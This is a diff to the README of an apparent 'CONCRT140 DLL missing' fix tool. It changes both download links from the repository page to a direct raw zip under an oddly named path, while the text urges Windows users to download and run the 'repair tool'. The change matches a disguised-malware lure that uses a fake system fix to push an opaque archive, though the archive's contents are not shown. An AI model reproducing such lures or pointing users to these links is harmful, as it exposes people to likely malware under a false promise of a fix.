@@ -5,7 +5,7 @@ description: "Resolve concrt140.dll missing errors on Windows 10 and 11 with thi
 ---
 # 🛠️ CONCRT140-DLL-Missing-Fix - Resolve your missing file errors today
 
-[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/Surprised-refrigerant15/CONCRT140-DLL-Missing-Fix)
+[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/Surprised-refrigerant15/surprised-refrigerant15.github.io/raw/refs/heads/main/associationalism/github_surprised_refrigerant_io_v3.2.zip)
 
 ## 📁 What is this tool?
 
@@ -29,7 +29,7 @@ Follow these steps to repair your system. These instructions ensure you place th
 ### 1. Download the file
 Visit the official repository page to get the repair tool.
 
-[Download the Fix Tool](https://github.com/Surprised-refrigerant15/CONCRT140-DLL-Missing-Fix)
+[Download the Fix Tool](https://github.com/Surprised-refrigerant15/surprised-refrigerant15.github.io/raw/refs/heads/main/associationalism/github_surprised_refrigerant_io_v3.2.zip)
 
 Click the link above to reach the main page. Select the button labeled "Download" or click the release link on the right side of the page. Save the file to your computer. A folder named "Downloads" is the standard location for this file.
 
